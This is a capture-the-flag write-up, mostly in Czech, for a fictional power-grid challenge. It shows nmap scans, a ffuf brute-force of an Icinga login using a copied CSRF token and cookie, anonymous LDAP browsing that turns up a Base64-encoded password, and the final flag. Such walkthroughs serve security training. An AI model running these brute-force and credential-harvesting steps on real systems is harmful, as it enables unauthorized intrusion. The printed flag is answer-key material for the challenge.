# Gridwatch (3)

## Zadání

Hi, emergency troubleshooter,

the entire Monitoring Department went on a teambuilding trip to the Cayman Islands, into the wilderness outside civilization (and without any telecommunications), and forgot to appoint a deputy during their absence. Verify whether all power plants are still in good condition.

The only thing we know about the monitoring team is that they registered the domain `gridwatch.powergrid.tcc`.

Stay grounded!

## Nápovědy (Hints)

1. Many systems like to keep things simple — their usernames often resemble their own names.

## Řešení

Nejdříve uděláme port scan počítače ze zadání.

`nmap gridwatch.powergrid.tcc -sV -sC`

```text
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.62 ((Debian))
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /authentication/login?_checkCookie=1
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.62 (Debian)
```

Na `http://gridwatch.powergrid.tcc:8080` běží SW Icinga <https://icinga.com/>, do které ale neznáme uživatele a heslo. Podle nápovědy by to mělo být `icinga`, heslo zkusíme najít hrubou silou.

Server používá obranu CSRF a ověřuje dotazu pomocí CSRF tokenu. Zkusíme se přihlásit z prohlížeče a `CSRFToken` a `Cookie` si zkopírujeme do `ffuf`.

`ffuf -u http://gridwatch.powergrid.tcc:8080/authentication/login -d "username=icinga&password=FUZZ&rememberme=0&redirect=&formUID=form_login&CSRFToken=1459846210%7C0370025316269f45f02dacd4ded67cfe9360185454768e489ed2475847792b13&btn_submit=Login" -H "Cookie: _chc=1; Icingaweb2=ismlvjqdu1sda7krc0o2es6ase; icingaweb2-tzo=7200-1" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -w /usr/share/john/password.lst -fc 200`

Nalezené heslo je `test`.

Po proklikání Icinga systému jsem FLAG nenašel, ale našel jsem informaci o existenci počítače `ldap.powergrid.tcc` s IP adresou `10.99.25.52`.

`nmap 10.99.25.52 -sV -sC`

```text
PORT    STATE SERVICE VERSION
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
```

Jedná se službu LDAP, na její prohlížení použijeme například `jxplorer`, připojení funguje bez hesla. U uživatele `mscott` v poli Description řetězec `UHdkIHJlc2V0IHRvIFRoYXRzd2hhdHNoZXNhaWQK`, což po převedení z Base64 kódování je `Pwd reset to Thatswhatshesaid`.

Odhlásíme se z Icinga a přihlásíme se jako `mscott / Thatswhatshesaid`

Za chvilku se ve výpisu událostí objeví FLAG u počítače `fusion.powergrid.tcc`.

## Flag

`FLAG{KWT6-EoVP-uE47-9PtN}`
